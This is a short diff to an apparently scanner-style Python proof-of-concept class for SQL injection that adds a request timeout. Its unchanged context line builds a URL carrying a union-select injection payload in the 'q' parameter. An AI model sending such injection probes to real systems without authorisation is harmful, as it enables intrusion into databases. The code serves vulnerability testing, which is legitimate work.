@@ -24,7 +24,7 @@ class SqliPOC(BasePoc):
         vul_url = '%s/?q=node\' and union select * from sec_test ' % self.url
 
         try:
-            r = requests.get(vul_url, verify=False)
+            r = requests.get(vul_url, verify=False, timeout=30)
         except requests.ConnectionError:
             # 可能的封禁
             raise requests.ConnectionError
